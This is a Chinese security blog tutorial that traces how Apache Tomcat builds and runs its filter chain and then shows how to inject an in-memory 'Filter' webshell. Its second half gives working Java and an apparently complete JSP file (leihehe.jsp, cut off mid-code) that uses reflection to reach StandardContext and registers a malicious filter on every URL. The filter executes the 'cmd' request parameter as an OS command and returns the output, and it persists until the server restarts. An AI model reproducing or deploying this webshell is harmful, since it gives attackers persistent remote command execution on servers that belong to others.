+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208185001033.png" alt="image-20211208185001033" loading="lazy"></p>
+<p>这样一个<strong>context</strong>就配置好了。</p>
+<h2 id="Filter是如何从context中被添加进filterChain的？"><a href="#Filter是如何从context中被添加进filterChain的？" class="headerlink" title="Filter是如何从context中被添加进filterChain的？"></a>Filter是如何从context中被添加进filterChain的？</h2><p><code>org.apache.catalina.core.StandardWrapperValve</code>的<code>invoke()</code>call到**createFilterChain()**，</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208201730461.png" alt="image-20211208201730461" loading="lazy">创建filterChain，</p>
+<p>我们可以看到在<strong>createFilterChain()<strong>方法里，我们获取到了</strong>context</strong>，从而从这个<strong>context</strong>中获取到<strong>filterMaps</strong></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208201919328.png" alt="image-20211208201919328" loading="lazy"></p>
+<p><strong>FilterMaps</strong>中存放的就是我们web.xml中写到的<code>&lt;filter-maping&gt;&lt;/filter-mapping&gt;</code></p>
+<p>接着匹配当前访问的URL和filterMap中的URL是否一样(第一个if)，如果匹配，将从<strong>filterConfig</strong>中寻找该<strong>filterMap</strong>中对应的名字，如果找到了，就将该<strong>Filter</strong>的<strong>filterConfig</strong>添加进<strong>filterChain</strong>里。</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208202205923.png" alt="image-20211208202205923" loading="lazy"></p>
+<p>我们继续跟踪到<strong>addFilter()<strong>，最后</strong>filterConfig</strong>会被放入<strong>filters</strong>数组当中。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">addFilter</span><span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">[</span><span class="token punctuation">]</span> newFilters <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>filters<span class="token punctuation">;</span>
+    <span class="token keyword">int</span> var3 <span class="token operator">=</span> newFilters<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var4 <span class="token operator">&lt;</span> var3<span class="token punctuation">;</span> <span class="token operator">++</span>var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">ApplicationFilterConfig</span> filter <span class="token operator">=</span> newFilters<span class="token punctuation">[</span>var4<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>filter <span class="token operator">==</span> filterConfig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>n <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>filters<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果n等于当前filters数组的长度，那么就给filter数组扩容</span>
+        newFilters <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>n <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>filters<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> newFilters<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>filters <span class="token operator">=</span> newFilters<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">this</span><span class="token punctuation">.</span>filters<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>n<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> filterConfig<span class="token punctuation">;</span><span class="token comment">//将filter放入的filters数组的同时，将n+1，相当于是在计数</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Filter的执行"><a href="#Filter的执行" class="headerlink" title="Filter的执行"></a>Filter的执行</h2><p>现在<strong>filters</strong>数组（也就是<strong>filterChain</strong>）已经被组装完毕了，它又该如何被执行呢？</p>
+<p>现在继续回到<strong>StandardWrapperValve.invoke()</strong></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208220131316.png" alt="image-20211208220131316" loading="lazy">很明显，filterChain中的filter被执行了 - <code>doFilter()</code></p>
+<p>跟进去看看：<strong>ApplicationFilterChain.doFilter():<strong>调用了</strong>internalDoFilter</strong>()</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208220257323.png" alt="image-20211208220257323" loading="lazy"></p>
+<p>继续跟：</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208220517246.png" alt="image-20211208220517246" loading="lazy"></p>
+<p>然后调用到了我们写在TestFilter.java里面的<code>doFilter()</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>
+<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">//执行过滤操作</span>
+
+    filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span>servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>至此，我们整个filter的执行就到此结束。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们来总结一下涉及到的一些Class，这里都以英文字面意思来理解比较容易。</p>
+<p>Filter的配置是由我们手动写在<strong>web.xml</strong>文件里的，所以需要把配置取出来，封装进这个web程序的context里面，以便其它地方调用。</p>
+<ul>
+<li><p>ContextConfig - 专门<strong>配置</strong>Context(可以理解为存储当前web程序信息)的类。</p>
+<ul>
+<li>ContextConfig类负责监听<strong>Lifecycle.CONFIGURE_START_EVENT</strong>，也就是“配置开始”事件，监听到就会开始配置 - **configureStart()**。</li>
+<li>ConfigureStart()中会call到webConfig()<strong>方法 - <strong>webConfig</strong>需要先从</strong>web.xml中把内容取出来，先创建一个WebXml类的instance.</li>
+<li>用configureContext(webXml)把webXml的内容都存入当前的context。</li>
+</ul>
+</li>
+<li><p>StandardWrapperValve - 一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</p>
+<ul>
+<li><p>把这个StandardWrapperValve简单理解为一个servlet，这个servlet接收到了数据，就要对数据进行过滤，要过滤就要先获取过滤规则，也就是我们的过滤器Filters</p>
+</li>
+<li><p>它利用ApplicationFilterFactory.createFilterChain()来创建一个FilterChain = 》 里面是所有匹配到的filterConfig的集合 </p>
+<ul>
+<li>createFilterChain()读取了当前context，并从获取到的context中读取到了<strong>filterMaps</strong> =》 里面是所有filter的mapping的情况（<strong>见环境搭建中的web.xml文件）</strong>，如果当前访问的URL匹配上了filter mapping，且在<strong>filterConfig</strong>中有其filter-name有对应的filter-class被配置，那么就将这个<strong>filterConfig</strong>添加进filterChain里面，以供使用。至此，filterChain组装完毕。</li>
+</ul>
+</li>
+<li><p>filterChain有了，接下来就是依次去触发filter了。StandardWrapperValve执行filterChain.doFilter()开始执行chain里面的filter。</p>
+<ul>
+<li>从chain里面获取filterConfig，再从filterConfig中获取到filter</li>
+</ul>
+</li>
+<li><p>最后执行filter.doFilter()</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>可以看出来，一个filter被执行的条件</strong>：</p>
+<ul>
+<li>在context#filterMaps中，有和当前访问URL相匹配的<strong>url-pattern</strong></li>
+</ul>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>testFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--url要匹配--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><p>filterConfig中需要有这个filter名字对应的class</p>
+<p>filterConfig中不仅存放了<strong>filterDef</strong>，还存放了当时的context。filterDef对应xml中如下内容：</p>
+</li>
+</ul>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>testFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span> 
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>   <span class="token comment">&lt;!--class要匹配上filter name--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>假设我们要自己构造一个这样的符合条件的filter应该怎么做呢？</p>
+<h1 id="Filter内存马的运用"><a href="#Filter内存马的运用" class="headerlink" title="Filter内存马的运用"></a>Filter内存马的运用</h1><h2 id="构造内存马思路"><a href="#构造内存马思路" class="headerlink" title="构造内存马思路"></a>构造内存马思路</h2><ul>
+<li>构造一个含恶意代码的filter</li>
+<li>用filterDef将filter进行封装(filter-name,filter-class)</li>
+<li>将构造的filterDef添加到filterDefs和filterConfigs中</li>
+<li>创建一个新的filterMap将URL和filter进行绑定，并添加到filterMaps中</li>
+</ul>
+<blockquote>
+<p>要注意的是，因为filter生效会有一个先后顺序，所以一般来讲我们还需要把我们的filter给移动到FilterChain的第一位去。</p>
+<p>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启。</p>
+</blockquote>
+<h2 id="开始构造内存马"><a href="#开始构造内存马" class="headerlink" title="开始构造内存马"></a>开始构造内存马</h2><h3 id="获取context"><a href="#获取context" class="headerlink" title="获取context"></a>获取context</h3><p>前面说到，FilterMaps是放在context的，所以需要先得到context.</p>
+<p>当我们访问一个jsp文件的时候，该jsp文件能够接收到request,所以我们可以获取到该request的servletContext</p>
+<p>观察一下servletContext的内容：</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209102528669.png" alt="image-20211209102528669" loading="lazy"></p>
+<p>我们发现实际上内容都是在<strong>StandardContext</strong>里面的 - servletContext的context是ApplicationContext类，ApplicationContext是StandardContext类。</p>
+<p><strong>可以一层一层获取</strong>：最终获取到StandardContext</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取servletContext</span>
+
+<span class="token class-name">Field</span> appctx <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取servletContext.context</span>
+appctx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> appctx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//得到applicationContext</span>
+
+<span class="token class-name">Field</span> stdctx <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取applicationContext.context</span>
+stdctx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> stdctx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//得到standardContext</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p><strong>其它的context获取方法：</strong></p>
+<p>从线程中获取StandardContext 如果没有request对象的话可以从当前线程中获取 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/114625962">https://zhuanlan.zhihu.com/p/114625962</a></p>
+<p>从MBean中获取 <a target="_blank" rel="noopener" href="https://scriptboy.cn/p/tomcat-filter-inject/">https://scriptboy.cn/p/tomcat-filter-inject/</a></p>
+</blockquote>
+<h3 id="修改context-amp-创建恶意Filter"><a href="#修改context-amp-创建恶意Filter" class="headerlink" title="修改context&amp;创建恶意Filter"></a>修改context&amp;创建恶意Filter</h3><p><strong>StandardContext</strong>中可以看到：其包含了我们需要用到的filterConfigs, filterDefs, filterMaps</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209103331546.png" alt="image-20211209103331546" loading="lazy"></p>
+<p>按照之前的思路：</p>
+<blockquote>
+<ul>
+<li>构造一个含恶意代码的filter</li>
+<li>用filterDef将filter进行封装(filter-name,filter-class)</li>
+<li>将构造的filterDef添加到filterDefs和filterConfigs中</li>
+<li>创建一个新的filterMap将URL和filter进行绑定，并添加到filterMaps中</li>
+</ul>
+</blockquote>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"leihehe"</span><span class="token punctuation">;</span><span class="token comment">//先设置这个恶意filter的名字</span>
+<span class="token comment">/*获取filterConfigs*/</span>
+<span class="token class-name">Field</span> <span class="token class-name">Configs</span> <span class="token operator">=</span> standardContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Map</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取到filterConfigs => 一堆filterConfig的集合</span>
+
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span>filterConfigs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//判断我们自己设定filter名字的filterConfig是否不存在</span>
+    		<span class="token comment">/* 不存在，开始创建恶意 Filter */</span>
+        <span class="token class-name">Filter</span> filter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token annotation punctuation">@Override</span>
+            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
+            <span class="token punctuation">&#125;</span>
+
+            <span class="token annotation punctuation">@Override</span>
+            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
+                <span class="token comment">//这段代码是shell恶意代码，就不详细解释了</span>
+                <span class="token class-name">HttpServletRequest</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> servletRequest<span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                    <span class="token class-name">Process</span> process <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//windows环境下测试</span>
+                    <span class="token comment">//Process process = new ProcessBuilder("bash","-c",req.getParameter("cmd")).start();</span>
+                    <span class="token keyword">int</span> len <span class="token operator">=</span> process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    process<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">return</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span>servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+
+            <span class="token annotation punctuation">@Override</span>
+            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+            <span class="token punctuation">&#125;</span>
+
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/**
+         * 创建一个FilterDef 然后设置我们filterDef的名字，和类名，以及类
+         */</span>
+        <span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">// 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中</span>
+        standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/**
+         * 创建一个filtermap
+         * 设置filter的名字和对应的urlpattern
+         */</span>
+        <span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span>REQUEST<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span>
+    
+        <span class="token comment">/**
+         * 将filtermap 添加到 filterMaps 中的第一个位置
+         */</span>
+        standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/**
+         * 利用反射创建 FilterConfig，并且将 filterDef 和 standardCtx（即 Context）作为参数进行传入
+         */</span>
+        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">/**
+         * 将 name 和 filterConfig 作为 key-value进行传入
+         */</span>
+        filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Inject Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="最终内存马"><a href="#最终内存马" class="headerlink" title="最终内存马"></a>最终内存马</h3><p><strong>leihehe.jsp</strong></p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;java.util.Map&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;java.lang.reflect.Constructor&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;org.apache.catalina.Context&quot; %&gt;
+&lt;%@ page language&#x3D;&quot;java&quot; contentType&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot; pageEncoding&#x3D;&quot;UTF-8&quot;%&gt;
+&lt;%
+
+  ServletContext servletContext &#x3D; request.getSession().getServletContext();&#x2F;&#x2F;获取servletContext
+
+  Field appctx &#x3D; servletContext.getClass().getDeclaredField(&quot;context&quot;);&#x2F;&#x2F;获取servletContext.context
+  appctx.setAccessible(true);
+  ApplicationContext applicationContext &#x3D; (ApplicationContext) appctx.get(servletContext);&#x2F;&#x2F;得到applicationContext
+
+  Field stdctx &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;);&#x2F;&#x2F;获取applicationContext.context
+  stdctx.setAccessible(true);
+  StandardContext standardContext &#x3D; (StandardContext) stdctx.get(applicationContext);&#x2F;&#x2F;得到standardContext
+
+  final String name &#x3D; &quot;leihehe&quot;;&#x2F;&#x2F;先设置这个恶意filter的名字
+&#x2F;*获取filterConfigs*&#x2F;
+Field Configs &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+Configs.setAccessible(true);
+Map filterConfigs &#x3D; (Map) Configs.get(standardContext);&#x2F;&#x2F;获取到filterConfigs &#x3D;&gt; 一堆filterConfig的集合
+
+
+if (filterConfigs.get(name) &#x3D;&#x3D; null)&#123;&#x2F;&#x2F;判断我们自己设定filter名字的filterConfig是否不存在
+    		&#x2F;* 不存在，开始创建恶意 Filter *&#x2F;
+        Filter filter &#x3D; new Filter() &#123;
+            @Override
+            public void init(FilterConfig filterConfig) throws ServletException &#123;
+            &#125;
+
+            @Override
+            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;
+                &#x2F;&#x2F;这段代码是shell恶意代码，就不详细解释了
+                HttpServletRequest req &#x3D; (HttpServletRequest) servletRequest;
